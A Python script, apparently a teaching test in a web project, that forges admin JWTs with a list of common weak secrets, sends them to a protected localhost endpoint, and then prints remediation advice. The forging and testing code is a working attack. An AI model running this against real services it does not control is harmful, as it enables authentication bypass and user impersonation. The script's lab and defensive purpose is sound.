#!/usr/bin/env python3
"""
JWT Weak Secret Attack Demonstration

This script demonstrates how weak JWT secrets can be exploited by attackers.
It attempts to forge JWT tokens using common weak secrets and tests them
against a protected API endpoint.

PEDAGOGICAL PURPOSE:
- Show why strong, randomly-generated secrets are critical
- Demonstrate that JWT signature verification only works if secret is protected
- Illustrate a realistic attack scenario

USAGE:
    1. Start the backend server (docker compose up -d)

    2. Run this attack script:
       python3 tests/weak_secret_attack.py

    3. Observe which weak secrets allow forged tokens to be accepted

WHAT THIS DEMONSTRATES:
- If your SECRET_KEY is weak, attackers can forge valid JWTs for any user
- Common weak secrets are easily guessed through brute force
- The attack succeeds when the secret matches the server's SECRET_KEY
"""

import json
import jwt
import urllib.request
import urllib.error
from datetime import datetime, timedelta

# Target API endpoint (assumes server running on localhost:8000)
API_URL = "http://localhost:8000/api/protected"

# Common weak secrets that developers might use (NEVER use these!)
WEAK_SECRETS = [
    "secret",
    "dev-secret-key",
    "12345",
    "password",
    "",  # Empty string
]


def forge_token(secret):
    """
    Create a forged JWT token for admin@example.com using the given secret.

    Args:
        secret: The secret key to use for signing the JWT

    Returns:
        A JWT token string signed with the provided secret
    """
    # Create a payload claiming to be an admin user
    payload = {
        "sub": "admin@example.com",  # Subject (user email)
        "exp": datetime.utcnow() + timedelta(hours=1)  # Expires in 1 hour
    }

    # Sign the token with the weak secret
    # If this secret matches the server's SECRET_KEY, the token will be accepted!
    token = jwt.encode(payload, secret, algorithm="HS256")

    return token


def test_forged_token(token, secret_name):
    """
    Test a forged token against the protected API endpoint.

    Args:
        token: The JWT token to test
        secret_name: Name of the secret used (for display purposes)

    Returns:
        True if token was accepted, False otherwise
    """
    try:
        # Send request to protected endpoint with forged token
        req = urllib.request.Request(
            API_URL,
            headers={"Authorization": f"Bearer {token}"},
        )
        response = urllib.request.urlopen(req, timeout=5)
        data = json.loads(response.read().decode())

        print(f"  SUCCESS: Forged token accepted with secret {secret_name}")
        print(f"  Server response: {data}")
        return True

    except urllib.error.HTTPError as e:
        print(f"  REJECTED: Token with secret {secret_name} was rejected")
        print(f"  Status code: {e.code}")
        return False

    except urllib.error.URLError:
        print(f"  ERROR: Cannot connect to {API_URL}")
        print("  Make sure the backend server is running (docker compose up -d)")
        return False


def main():
    """
    Main attack simulation function.
    Attempts to forge tokens with various weak secrets.
    """
    print("=" * 70)
    print("JWT WEAK SECRET ATTACK DEMONSTRATION")
    print("=" * 70)
    print()
    print("This script attempts to forge JWT tokens using common weak secrets.")
    print(f"Target API: {API_URL}")
    print()
    print("ATTACK SCENARIO:")
    print("- Attacker wants to access protected resources as 'admin@example.com'")
    print("- Attacker doesn't know the server's SECRET_KEY")
    print("- Attacker tries common weak secrets to forge a valid JWT")
    print()
    print("=" * 70)
    print()

    # Track if any attack succeeded
    attack_succeeded = False

    # Try each weak secret
    for i, secret in enumerate(WEAK_SECRETS, 1):
        secret_display = f"'{secret}'" if secret else "'<empty string>'"
        print(f"[Attempt {i}/{len(WEAK_SECRETS)}] Testing secret: {secret_display}")

        # Forge a token with this weak secret
        forged_token = forge_token(secret)

        # Test if the server accepts it
        if test_forged_token(forged_token, secret_display):
            attack_succeeded = True

        print()

    # Summary
    print("=" * 70)
    print("ATTACK SUMMARY")
    print("=" * 70)

    if attack_succeeded:
        print("VULNERABILITY CONFIRMED!")
        print()
        print("At least one weak secret allowed token forgery.")
        print("This means an attacker can:")
        print("  - Access protected resources as any user")
        print("  - Bypass authentication completely")
        print("  - Perform actions on behalf of legitimate users")
        print()
        print("REMEDIATION:")
        print("  1. Generate a strong secret: openssl rand -hex 32")
        print("  2. Store it in .env file (never commit to Git)")
        print("  3. Use python-dotenv to load it at runtime")
    else:
        print("Server is using a strong secret!")
        print()
        print("None of the weak secrets allowed token forgery.")
        print("This indicates the server is properly configured with a")
        print("strong, randomly-generated SECRET_KEY.")
        print()
        print("BEST PRACTICE CONFIRMED:")
        print("  - Secret is not a common/weak value")
        print("  - Attacker cannot easily guess or brute-force it")

    print("=" * 70)


if __name__ == "__main__":
    main()
